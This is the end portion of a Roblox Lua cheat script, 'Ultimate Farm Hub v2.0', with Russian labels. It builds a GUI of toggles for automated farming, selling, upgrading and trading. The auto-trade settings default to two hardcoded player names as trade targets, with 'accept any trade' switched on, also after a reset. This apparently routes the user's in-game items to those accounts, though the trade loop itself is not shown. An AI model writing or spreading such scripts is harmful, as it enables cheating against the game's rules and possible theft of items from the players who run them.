            saveSettings()
        end
    end)
    
    UserInputService.InputChanged:Connect(function(input)
        if isDragging and input.UserInputType == Enum.UserInputType.MouseMovement then
            local mousePos = UserInputService:GetMouseLocation()
            local sliderPos = sliderFrame.AbsolutePosition.X
            local sliderWidth = sliderFrame.AbsoluteSize.X
            local relativeX = math.clamp((mousePos.X - sliderPos) / sliderWidth, 0, 1)
            
            kickPower = relativeX
            sliderButton.Position = UDim2.new(relativeX, -15, 0, 0)
            kickPowerValue.Text = string.format("%.1f", kickPower)
        end
    end)
    
    kickWaveLabel = createInfoLabel(kickSection, "Волны: --", 145)
    
    -- BP Section
    local bpSection = createSection(mainScroll, "🎁 AUTO BATTLEPASS", 120)
    bpToggle, bpStatus = createToggle(bpSection, "BP", 35)
    bpInfoLabel = createInfoLabel(bpSection, "XP: -- | Собрано: 0", 85)
    
    -- Sell Section
    local sellSection = createSection(mainScroll, "💰 AUTO SELL", 100)
    sellToggle, sellStatus = createToggle(sellSection, "SELL", 35)
    
    -- Bonus Section
    local bonusSection = createSection(mainScroll, "🎯 AUTO BONUS CLICK", 100)
    bonusToggle, bonusStatus = createToggle(bonusSection, "BONUS", 35)
    
    -- Speed Section
    local speedSection = createSection(mainScroll, "⬆ AUTO SPEED UPGRADE", 100)
    speedUpgradeToggle, speedUpgradeStatus = createToggle(speedSection, "SPEED", 35)
    
    -- Weight Section
    local weightSection = createSection(mainScroll, "🏋 AUTO BEST WEIGHT", 100)
    weightToggle, weightStatus = createToggle(weightSection, "WEIGHT", 35)
    
    -- Buy Weight Section
    local buyWeightSection = createSection(mainScroll, "🛒 AUTO BUY WEIGHT", 100)
    buyWeightToggle, buyWeightStatus = createToggle(buyWeightSection, "BUY W", 35)
    
    -- Trade Section
    local tradeSection = createSection(mainScroll, "🤝 AUTO TRADE", 120)
    tradeToggle, tradeStatus = createToggle(tradeSection, "TRADE", 35)
    tradeInfoLabel = createInfoLabel(tradeSection, "Статус: Ожидание...", 85)
    
    mainScroll.CanvasSize = UDim2.new(0, 0, 0, 1200)
    
    -- Trade Content
    local tradeScroll = createContentTab("Trade")
    
    local tradeSettingsSection = createSection(tradeScroll, "🤝 НАСТРОЙКИ ТРЕЙДА", 300)
    
    -- Принимать любой трейд
    local acceptAnyFrame = Instance.new("Frame")
    acceptAnyFrame.Size = UDim2.new(1, -20, 0, 40)
    acceptAnyFrame.Position = UDim2.new(0, 10, 0, 35)
    acceptAnyFrame.BackgroundColor3 = guiSettings.buttonColor
    acceptAnyFrame.BorderSizePixel = 0
    acceptAnyFrame.BackgroundTransparency = 0.5
    acceptAnyFrame.Parent = tradeSettingsSection
    Instance.new("UICorner", acceptAnyFrame).CornerRadius = UDim.new(0, 8)
    
    local acceptAnyLabel = Instance.new("TextLabel")
    acceptAnyLabel.Size = UDim2.new(0.6, 0, 0, 20)
    acceptAnyLabel.Position = UDim2.new(0, 10, 0, 10)
    acceptAnyLabel.BackgroundTransparency = 1
    acceptAnyLabel.Text = "Принимать любой трейд:"
    acceptAnyLabel.TextColor3 = guiSettings.textColor
    acceptAnyLabel.TextSize = guiSettings.fontSize - 2
    acceptAnyLabel.Font = Enum.Font.Gotham
    acceptAnyLabel.TextXAlignment = Enum.TextXAlignment.Left
    acceptAnyLabel.Parent = acceptAnyFrame
    
    local acceptAnyToggle = Instance.new("TextButton")
    acceptAnyToggle.Size = UDim2.new(0.3, 0, 0, 30)
    acceptAnyToggle.Position = UDim2.new(0.65, 0, 0, 5)
    acceptAnyToggle.BackgroundColor3 = acceptAnyTrade and guiSettings.successColor or guiSettings.activeColor
    acceptAnyToggle.TextColor3 = guiSettings.accentColor
    acceptAnyToggle.TextSize = 12
    acceptAnyToggle.Font = Enum.Font.GothamBold
    acceptAnyToggle.Text = acceptAnyTrade and "✓ ВКЛ" or "✗ ВЫКЛ"
    acceptAnyToggle.BorderSizePixel = 0
    acceptAnyToggle.Parent = acceptAnyFrame
    Instance.new("UICorner", acceptAnyToggle).CornerRadius = UDim.new(0, 15)
    
    acceptAnyToggle.MouseButton1Click:Connect(function()
        acceptAnyTrade = not acceptAnyTrade
        acceptAnyToggle.BackgroundColor3 = acceptAnyTrade and guiSettings.successColor or guiSettings.activeColor
        acceptAnyToggle.Text = acceptAnyTrade and "✓ ВКЛ" or "✗ ВЫКЛ"
        saveSettings()
    end)
    
    -- Список целей для трейда
    local targetsLabel = createInfoLabel(tradeSettingsSection, "Цели трейда:", 85)
    
    local targetsInput = Instance.new("TextBox")
    targetsInput.Size = UDim2.new(0.8, 0, 0, 30)
    targetsInput.Position = UDim2.new(0.1, 0, 0, 105)
    targetsInput.BackgroundColor3 = guiSettings.buttonColor
    targetsInput.TextColor3 = guiSettings.textColor
    targetsInput.TextSize = 12
    targetsInput.Font = Enum.Font.Gotham
    targetsInput.Text = table.concat(tradeTargets, ", ")
    targetsInput.PlaceholderText = "Введите имена через запятую..."
    targetsInput.PlaceholderColor3 = guiSettings.subTextColor
    targetsInput.BorderSizePixel = 0
    targetsInput.Parent = tradeSettingsSection
    Instance.new("UICorner", targetsInput).CornerRadius = UDim.new(0, 8)
    Instance.new("UIStroke", targetsInput).Color = guiSettings.borderColor
    
    targetsInput.FocusLost:Connect(function(enterPressed)
        local text = targetsInput.Text
        local targets = {}
        for target in text:gmatch("[^,%s]+") do
            if target ~= "" then
                table.insert(targets, target)
            end
        end
        if #targets > 0 then
            tradeTargets = targets
            saveSettings()
        end
    end)
    
    -- Информация о трейде
    local tradeInfoSection = createSection(tradeScroll, "📊 ИНФОРМАЦИЯ", 120)
    local tradeStatusLabel = createInfoLabel(tradeInfoSection, "Статус: Неактивен", 30)
    local tradePartnerLabel = createInfoLabel(tradeInfoSection, "Партнёр: --", 50)
    local tradeItemsLabel = createInfoLabel(tradeInfoSection, "Предметов в трейде: 0", 70)
    
    -- BP Content
    local bpScroll = createContentTab("BP")
    local bpInfoSection = createSection(bpScroll, "📊 ИНФОРМАЦИЯ BP", 120)
    local bpxp = createInfoLabel(bpInfoSection, "XP: --", 30)
    local bpcl = createInfoLabel(bpInfoSection, "Собрано: --", 50)
    local bppr = createInfoLabel(bpInfoSection, "Premium: --", 70)
    
    -- Settings Content
    local settingsScroll = createContentTab("Settings")
    
    -- Настройки цветов
    local colorsSection = createSection(settingsScroll, "🎨 НАСТРОЙКИ ЦВЕТОВ", 500)
    
    local colorSettings = {
        {"Основной цвет", "primaryColor"},
        {"Вторичный цвет", "secondaryColor"},
        {"Цвет акцента", "accentColor"},
        {"Цвет текста", "textColor"},
        {"Цвет кнопок", "buttonColor"},
        {"Цвет активации", "activeColor"},
        {"Цвет успеха", "successColor"}
    }
    
    for i, colorSetting in ipairs(colorSettings) do
        local label = createInfoLabel(colorsSection, colorSetting[1], 30 + (i-1) * 40)
        
        local colorPicker = Instance.new("Frame")
        colorPicker.Size = UDim2.new(0.4, 0, 0, 25)
        colorPicker.Position = UDim2.new(0.55, 0, 0, 30 + (i-1) * 40)
        colorPicker.BackgroundColor3 = guiSettings[colorSetting[2]]
        colorPicker.BorderSizePixel = 0
        colorPicker.Parent = colorsSection
        Instance.new("UICorner", colorPicker).CornerRadius = UDim.new(0, 5)
        Instance.new("UIStroke", colorPicker).Color = guiSettings.accentColor
    end
    
    -- Другие настройки
    local otherSection = createSection(settingsScroll, "⚙ ДРУГИЕ НАСТРОЙКИ", 200)
    
    local resetButton = Instance.new("TextButton")
    resetButton.Size = UDim2.new(0.5, 0, 0, 40)
    resetButton.Position = UDim2.new(0.25, 0, 0, 50)
    resetButton.BackgroundColor3 = guiSettings.activeColor
    resetButton.TextColor3 = guiSettings.accentColor
    resetButton.TextSize = guiSettings.fontSize
    resetButton.Font = Enum.Font.GothamBold
    resetButton.Text = "СБРОС НАСТРОЕК"
    resetButton.BorderSizePixel = 0
    resetButton.Parent = otherSection
    Instance.new("UICorner", resetButton).CornerRadius = UDim.new(0, 20)
    resetButton.MouseButton1Click:Connect(function()
        guiSettings = {
            primaryColor = Color3.fromRGB(25, 25, 25),
            secondaryColor = Color3.fromRGB(35, 35, 35),
            accentColor = Color3.fromRGB(255, 255, 255),
            textColor = Color3.fromRGB(240, 240, 240),
            subTextColor = Color3.fromRGB(160, 160, 160),
            buttonColor = Color3.fromRGB(45, 45, 45),
            buttonHoverColor = Color3.fromRGB(60, 60, 60),
            activeColor = Color3.fromRGB(255, 60, 60),
            successColor = Color3.fromRGB(60, 255, 60),
            warningColor = Color3.fromRGB(255, 165, 0),
            borderColor = Color3.fromRGB(50, 50, 50),
            sliderColor = Color3.fromRGB(80, 80, 80),
            fontSize = 14,
            titleFontSize = 24,
            opacity = 0.95,
            animationSpeed = 0.3
        }
        kickPower = 1.0
        tradeTargets = {"Timka_q1t", "VipTimXavier"}
        acceptAnyTrade = true
        saveSettings()
        updateAllColors()
    end)
    
    -- Функция обновления цветов
    function updateAllColors()
        openButton.BackgroundColor3 = guiSettings.primaryColor
        openButton.BackgroundTransparency = 1 - guiSettings.opacity
        
        mainMenu.BackgroundColor3 = guiSettings.primaryColor
        mainMenu.BackgroundTransparency = 1 - guiSettings.opacity
        
        contentContainer.BackgroundColor3 = guiSettings.secondaryColor
        contentContainer.BackgroundTransparency = 1 - guiSettings.opacity
        
        titleBar.BackgroundColor3 = guiSettings.primaryColor
        titleLabel.TextColor3 = guiSettings.accentColor
    end
    
    -- Toggle функции
    local function toggle(btn, status, active, name)
        if active then
            btn.Text = "ВЫКЛЮЧИТЬ " .. name
            btn.BackgroundColor3 = guiSettings.activeColor
            status.Text = "● АКТИВЕН"
            status.TextColor3 = guiSettings.successColor
        else
            btn.Text = "ВКЛЮЧИТЬ " .. name
            btn.BackgroundColor3 = guiSettings.buttonColor
            status.Text = "● ВЫКЛЮЧЕН"
            status.TextColor3 = guiSettings.activeColor
        end
    end
    
    kickToggle.MouseButton1Click:Connect(function() isKickActive = not isKickActive; toggle(kickToggle, kickStatus, isKickActive, "KICK"); if isKickActive then task.spawn(kickLoop) end end)
    bpToggle.MouseButton1Click:Connect(function() isBpActive = not isBpActive; toggle(bpToggle, bpStatus, isBpActive, "BP"); if isBpActive then task.spawn(bpLoop) end end)
    sellToggle.MouseButton1Click:Connect(function() isAutoSell = not isAutoSell; toggle(sellToggle, sellStatus, isAutoSell, "SELL"); if isAutoSell then task.spawn(autoSellLoop) end end)
    bonusToggle.MouseButton1Click:Connect(function() isAutoBonus = not isAutoBonus; toggle(bonusToggle, bonusStatus, isAutoBonus, "BONUS"); if isAutoBonus then task.spawn(autoBonusLoop) end end)
    speedUpgradeToggle.MouseButton1Click:Connect(function() isAutoSpeedUpgrade = not isAutoSpeedUpgrade; toggle(speedUpgradeToggle, speedUpgradeStatus, isAutoSpeedUpgrade, "SPEED"); if isAutoSpeedUpgrade then task.spawn(autoSpeedUpgradeLoop) end end)
    weightToggle.MouseButton1Click:Connect(function() isAutoWeight = not isAutoWeight; toggle(weightToggle, weightStatus, isAutoWeight, "WEIGHT"); if isAutoWeight then task.spawn(autoWeightLoop) end end)
    buyWeightToggle.MouseButton1Click:Connect(function() isAutoBuyWeight = not isAutoBuyWeight; toggle(buyWeightToggle, buyWeightStatus, isAutoBuyWeight, "BUY W"); if isAutoBuyWeight then task.spawn(autoBuyWeightLoop) end end)
    tradeToggle.MouseButton1Click:Connect(function() isAutoTrade = not isAutoTrade; toggle(tradeToggle, tradeStatus, isAutoTrade, "TRADE"); if isAutoTrade then task.spawn(autoTradeLoop) end end)
    openButton.MouseButton1Click:Connect(function() mainMenu.Visible = true; openButton.Visible = false end)
    
    -- Update loop
    task.spawn(function()
        while true do
            local now = tick()
            if mainMenu.Visible and now - lastGUIUpdate > UPDATE_INTERVAL then
                lastGUIUpdate = now
                
                if updateCharacterReferences() then
                    local dist, count, rarity = getClosestWave()
                    kickWaveLabel.Text = string.format("Волны: %d | %.0f studs | %s", count, dist, rarity)
                end
                
                if bpData then
                    bpInfoLabel.Text = string.format("XP: %s | Собрано: %d", bpData.XP or 0, claimedCount)
                    bpxp.Text = "XP: " .. (bpData.XP or 0)
                    bpcl.Text = "Собрано: " .. claimedCount
                    bppr.Text = "Premium: " .. (bpData.HasPremium and "ДА" or "НЕТ")
                end
            end
            task.wait(0.1)
        end
    end)
end

-- ============ ЗАПУСК ============
createGUI()
player.CharacterAdded:Connect(function(c) character = c; task.wait(0.5); updateCharacterReferences() end)
if player.Character then updateCharacterReferences() end
getBPData()
print("Ultimate Farm Hub v2.0 loaded! Kick power slider, auto-trade, settings!")
